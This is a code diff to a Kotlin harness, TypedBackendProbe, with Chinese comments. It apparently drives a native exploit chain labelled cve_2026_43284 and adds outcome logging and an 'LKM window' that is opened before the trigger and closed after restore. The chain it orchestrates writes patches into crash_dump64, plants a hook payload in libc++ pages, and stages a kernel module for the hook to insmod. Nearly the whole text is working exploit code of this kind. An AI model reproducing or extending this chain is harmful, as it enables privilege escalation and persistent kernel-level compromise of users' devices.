@@ -858,9 +858,18 @@ object TypedBackendProbe {
      */
     private fun probe43284(step: (String) -> Unit) {
         val finish = RunFinish43284()
+        val lkmWindow = LkmWindow43284(emit = step)
         try {
-            probe43284Body(step, finish)
+            probe43284Body(step, finish, lkmWindow)
         } finally {
+            /*
+             * 窗口安全网：正常路径已在 restore 之后、teardown 之前关过（见 [probeAssembled43284]）；
+             * 早退（库缺失 / 建会话失败）或异常路径在这里补关一次。close 幂等，且只在真的持着 fd
+             * 时动手 —— 正常路径不会多出第二行 `lkm window: closed=…`，失败也不改变本次运行的主结果。
+             */
+            if (lkmWindow.isOpen()) {
+                lkmWindow.close()
+            }
             /* 收尾两行不参与抽样：一次运行各一行（ref 的 run.chain / run.trigger / run.wait 并成一行）。 */
             finish.emit { line -> step(line) }
         }
@@ -869,10 +878,11 @@ object TypedBackendProbe {
     /**
      *  43284 自检段的本体（原 [probe43284] 的函数体，机械改名）。
      *
-     *  @param step   统一日志回调。
-     *  @param finish 本次运行的收尾账（只写事实，不参与控制流）。
+     *  @param step      统一日志回调。
+     *  @param finish    本次运行的收尾账（只写事实，不参与控制流）。
+     *  @param lkmWindow LKM 驻留窗口：trigger 前打开、restore 后关闭；失败只记日志。
      */
-    private fun probe43284Body(step: (String) -> Unit, finish: RunFinish43284) {
+    private fun probe43284Body(step: (String) -> Unit, finish: RunFinish43284, lkmWindow: LkmWindow43284) {
         if (!Native43284.ensureLoaded()) {
             step("typed: 43284 library missing (lib" + Native43284.LIBRARY + ".so)")
             finish.noteError("library-missing")
@@ -1108,6 +1118,13 @@ object TypedBackendProbe {
         )
         meter.after("Native43284.resolveTarget", "code=" + code + " refusal=" + refusal[0])
         step("typed: 43284 resolveTarget(bad) code=" + code + " refusal=" + refusal[0])
+        /*
+         * LKM 驻留窗口：trigger 之前打开并持有 fd —— 持有 fd 本身就是占住窗口，关掉 fd 就是 UNLOAD。
+         * 参照 ghostlock-app-ref@5f184760:src/core/backend/cve_2026_43284/steps/chain.cpp:362-380 的
+         * finish()：窗口在钩子恢复之后关闭（本段把它留到 [probeAssembled43284] 的 restore 之后）。
+         * open 失败只记一行（带 errno 名），不参与本段任何返回值 / 控制流。
+         */
+        lkmWindow.open()
         meter.before(
             "Native43284.trigger",
             "handle=" + handle + " delayMs=" + TriggerSpec43284.DEFAULT_DELAY_MS + " (TriggerSpec43284.DEFAULT)",
@@ -1130,7 +1147,7 @@ object TypedBackendProbe {
         step("typed: 43284 destroy code=" + code + " refusal=" + refusal[0])
 
         meter.before("probeAssembled43284", "doorPath=" + doorPath.absolutePath)
-        probeAssembled43284(step, doorPath.absolutePath, finish)
+        probeAssembled43284(step, doorPath.absolutePath, finish, lkmWindow)
         meter.after("probeAssembled43284", "done")
 
         /* 43499 侧最小序列：建会话 → 按 route 取访问对象（1/2/3 都试，看工厂接受哪个）→ 收尾。 */
@@ -1375,6 +1392,37 @@ object TypedBackendProbe {
     }
 
     /**
+     *  一次写镜像的**真实账**：native 填的五个 long 进收尾账，并打一行与 `write outcome:` 同源的日志。
+     *
+     *  五数 = written / verified / rolled / overflow / incomplete（见 [RunFinish43284.noteOutcome]）；
+     *  数组由调用方在调用 [Assembled43284.writeImage] 之前分配、调用之后读。写失败不记账
+     *  （数组保持 0；主结果与拒绝名原样不动），但仍然打一行，让日志能回答「这次为什么没写成」。
+     *
+     *  @param finish  本次运行的收尾账
+     *  @param label   区域名（patch1-helper / patch1-target / hook-payload / hook-site / module / trigger-apply）
+     *  @param outcome 调用前分配、调用后读的五个 long
+     *  @param wrote   本次写是否报成功
+     *  @param step    统一日志回调
+     */
+    private fun noteWriteOutcome(
+        finish: RunFinish43284,
+        label: String,
+        outcome: LongArray,
+        wrote: Boolean,
+        step: (String) -> Unit,
+    ) {
+        if (wrote) {
+            finish.noteOutcome(outcome)
+        }
+        step(
+            "write outcome i=" + label + " wrote=" + wrote +
+                " written=" + outcome[0] + " verified=" + outcome[1] + " rolled=" + outcome[2] +
+                " overflow=" + outcome[3] + " incomplete=" + outcome[4] +
+                " total_written=" + finish.written + " total_verified=" + finish.verified,
+        )
+    }
+
+    /**
      * 用 Assembled43284 走一遍最小闭环（独立会话）：建 → 初始化 → 开门 → 读块 → 收尾。
      *
      * 这一段刻意只用**包装类**（拼装在 Kotlin），native 侧一行未改 —— 它验证的是包装类本身可用。
@@ -1382,11 +1430,17 @@ object TypedBackendProbe {
      * 本段同时是收尾账（[RunFinish43284]）的**事实来源**：模块区写成/验成、patch#1、钩子
      * 计划/武装/应用/恢复、触发、终态与收尾，都在事实发生的那一行旁边记账（只记事实，不改控制流）。
      *
-     * @param step   统一日志回调。
-     * @param doorPath 门探测用的路径（与应用缓存里的门文件同一个）。
-     * @param finish 本次运行的收尾账；收尾两行由 [probe43284] 在 finally 里统一打印。
+     * @param step      统一日志回调。
+     * @param doorPath  门探测用的路径（与应用缓存里的门文件同一个）。
+     * @param finish    本次运行的收尾账；收尾两行由 [probe43284] 在 finally 里统一打印。
+     * @param lkmWindow LKM 驻留窗口；本段在 restore 之后、teardown 之前关它。
      */
-    private fun probeAssembled43284(step: (String) -> Unit, doorPath: String, finish: RunFinish43284) {
+    private fun probeAssembled43284(
+        step: (String) -> Unit,
+        doorPath: String,
+        finish: RunFinish43284,
+        lkmWindow: LkmWindow43284,
+    ) {
         if (!Native43284.ensureLoaded()) {
             step("typed: assembled 43284 library missing")
             finish.noteError("library-missing")
@@ -1545,7 +1599,16 @@ object TypedBackendProbe {
         val helperForImage = stepwise.image(Assembled43284.ROLE_IMAGE_SPLICE_HELPER)
         meter.after("Assembled43284.image", "bytes=" + (helperForImage?.size ?: -1))
         meter.before("Assembled43284.writeImage", "offset=0 width=16 bytes=" + (helperForImage?.size ?: -1))
-        val patch1Wrote = if (helperForImage != null) stepwise.writeImage(helperForImage, 0L, 16L, saInit(seq.value)) else false
+        /* 本次写的真实五数：数组在这里分配、由 native 填、写完立刻进收尾账（见 noteWriteOutcome）。 */
+        val patch1Outcome = LongArray(RunFinish43284.OUTCOME_WORDS)
+        val patch1Wrote = if (helperForImage != null) {
+            stepwise.writeImage(helperForImage, 0L, 16L, saInit(seq.value), patch1Outcome)
+        } else {
+            false
+        }
+        if (helperForImage != null) {
+            noteWriteOutcome(finish, "patch1-helper", patch1Outcome, patch1Wrote, step)
+        }
         meter.after("Assembled43284.writeImage", "ok=" + patch1Wrote + " code=" + stepwise.lastCode + " refusal=" + stepwise.lastRefusal)
         step("typed: stepwise 43284 patch1 wrote=" + patch1Wrote + " refusal=" + stepwise.lastRefusal)
         meter.before("Assembled43284.destroyAccessNow", "access=" + stepwise.accessId)
@@ -1620,7 +1683,15 @@ object TypedBackendProbe {
                 " hmacNonZero=" + patchMaterial.hmacKey.count { byte -> byte != 0.toByte() },
         )
         meter.before("Assembled43284.writeImage", "offset=0 width=16 bytes=" + (helperForPatch?.size ?: -1) + " (patch1)")
-        val patchWrote = if (helperForPatch != null) patcher.writeImage(helperForPatch, 0L, 16L, patchMaterial) else false
+        val patchOutcome = LongArray(RunFinish43284.OUTCOME_WORDS)
+        val patchWrote = if (helperForPatch != null) {
+            patcher.writeImage(helperForPatch, 0L, 16L, patchMaterial, patchOutcome)
+        } else {
+            false
+        }
+        if (helperForPatch != null) {
+            noteWriteOutcome(finish, "patch1-target", patchOutcome, patchWrote, step)
+        }
         meter.after("Assembled43284.writeImage", "ok=" + patchWrote + " code=" + patcher.lastCode + " refusal=" + patcher.lastRefusal)
         /* 收尾账：patch#1 是 crash_dump64 的 helper 段，整段写成功即 ref 的 crash_dump_patched。 */
         finish.noteCrashDump(patchWrote)
@@ -1921,7 +1992,11 @@ meter.after("Assembled43284.fillPayloadSlots", "slots=" + payloadSlots)
 step("typed: hook payload slots=" + payloadSlots)
 meter.before("Assembled43284.writeImage", "offset=0x" + java.lang.Long.toHexString(hookLanding) + " width=16 bytes=" + (payload?.size ?: -1) + " (payload)")
 /* 序号来自会话（写成功一次就自动推进一次，ref real_ops.cpp:307-327），这里不再回查 native。 */
-val payloadWrote = if (planGate?.ok == true) hook.writeImage(payload, hookLanding, 16L, saInit(seq.value)) else false
+val payloadOutcome = LongArray(RunFinish43284.OUTCOME_WORDS)
+val payloadWrote = if (planGate?.ok == true) hook.writeImage(payload, hookLanding, 16L, saInit(seq.value), payloadOutcome) else false
+if (planGate?.ok == true) {
+    noteWriteOutcome(finish, "hook-payload", payloadOutcome, payloadWrote, step)
+}
 meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
                     step("typed: hook payload wrote=" + payloadWrote + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
                     /* 收尾账：载荷真的落进 libc++ 页即 ref 的 hook_armed。 */
@@ -1964,7 +2039,9 @@ meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.
                                 val target2 = if (restore) 733344L else blk02
                                 val toWrite = if (restore) restoreBytes else before
                                 meter.before("Assembled43284.writeImage", "offset=" + target2 + " width=16 restore=" + restore + " (site block)")
-                                val siteWrote = hook.writeImage(toWrite, target2, 16L, saInit(seq.value))
+                                val siteOutcome = LongArray(RunFinish43284.OUTCOME_WORDS)
+                                val siteWrote = hook.writeImage(toWrite, target2, 16L, saInit(seq.value), siteOutcome)
+                                noteWriteOutcome(finish, "hook-site", siteOutcome, siteWrote, step)
                                 meter.after("Assembled43284.writeImage", "ok=" + siteWrote + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
                                 meter.before("Assembled43284.readBlock", "hookDoor=" + hookDoor + " offset=" + target2 + " (site block readback)")
                                 val after = hook.readBlock(hookDoor, target2)
@@ -2064,15 +2141,21 @@ meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.
                 }
                 meter.before("Assembled43284.writeImage", "offset=0 width=16 bytes=" + moduleBytes.size + " (module -> carrier)")
                 /* 闸门关着就不写模块：闭包没通过时写进去的模块也没有钩子会 insmod 它。 */
-                val moduleWrote = if (planGate?.ok == true) module.writeImage(moduleBytes, 0L, 16L, saInit(seq.value)) else false
+                val moduleOutcome = LongArray(RunFinish43284.OUTCOME_WORDS)
+                val moduleWrote = if (planGate?.ok == true) module.writeImage(moduleBytes, 0L, 16L, saInit(seq.value), moduleOutcome) else false
+                if (planGate?.ok == true) {
+                    noteWriteOutcome(finish, "module", moduleOutcome, moduleWrote, step)
+                }
                 meter.after("Assembled43284.writeImage", "ok=" + moduleWrote + " code=" + module.lastCode + " refusal=" + module.lastRefusal)
                 step("typed: module wrote=" + moduleWrote + " code=" + module.lastCode + " refusal=" + module.lastRefusal)
                 /*
-                 *  收尾账的 written/verified 只记**模块区**：
-                 *   - written：整段报成功才计块（失败段不猜半途块数 —— native 只在它自己的 outcome 行里知道）；
-                 *   - verified：写完后按 512 B 粒度（每 32 块）抽样回读，**只数真的读回来且比中**的块。
-                 *  这两点与 ref 的 blocks_written / blocks_verified（chain.cpp:315/334）同义，
-                 *  区别只在「谁去读」：ref 在写循环里读，我们写完之后用同一条规则补读（不改写路径）。
+                 *  收尾账的两路数（本批之后的语义，别再混为一谈）：
+                 *   - written / verified / rolled / overflow / incomplete：**native 的账**（write outcome 行同源），
+                 *     由 noteWriteOutcome 在每次 writeImage 之后累加 —— 这里刚记过模块段，所以 finish.written
+                 *     已经包含模块的块数；
+                 *   - 抽样 verified：写完后按 512 B 粒度（每 32 块）补读，只数真的读回来且比中的块，
+                 *     只进 `verify sampling:` 行（不覆盖 native 的 verified）。
+                 *  模块区的总块数（noteModuleWritten）仍是抽样率行的分母。
                  */
                 if (moduleWrote) {
                     finish.noteModuleWritten(moduleBytes.size)
@@ -2126,7 +2209,9 @@ meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.
                         cur[atNow + 2] = ((w shr 16) and 0xFF).toByte()
                         cur[atNow + 3] = ((w shr 24) and 0xFF).toByte()
                         meter.before("Assembled43284.writeImage", "offset=" + blkNow + " width=16 (trigger-time site apply)")
-                        val triggerApplyWrote = hook.writeImage(cur, blkNow, 16L, saInit(seq.value))
+                        val triggerApplyOutcome = LongArray(RunFinish43284.OUTCOME_WORDS)
+                        val triggerApplyWrote = hook.writeImage(cur, blkNow, 16L, saInit(seq.value), triggerApplyOutcome)
+                        noteWriteOutcome(finish, "trigger-apply", triggerApplyOutcome, triggerApplyWrote, step)
                         meter.after("Assembled43284.writeImage", "ok=" + triggerApplyWrote + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
                         step("typed: trigger-time apply wrote=" + triggerApplyWrote)
                     }
@@ -2293,6 +2378,12 @@ meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.
             finish.noteHookRestored(false, problem.javaClass.simpleName)
         }
         }
+        /*
+         * LKM 驻留窗口的关点：restore 已跑完（成功、无会话、异常三条路径都落到这里），teardown 还没开始 ——
+         * 与 ref finish() 的顺序一致（chain.cpp:362-380：restore_hook → close_lkm_channel → release）。
+         * close 失败只记一行（带 errno 名），不进收尾账、不改 cleanup 判定。
+         */
+        lkmWindow.close()
         step("typed: patch1 wrote=" + patchWrote + " refusal=" + patcher.lastRefusal +
             " helperBytes=" + (helperForPatch?.size ?: -1))
         meter.before("Assembled43284.destroyAccessNow", "patch1 access=" + patcher.accessId)
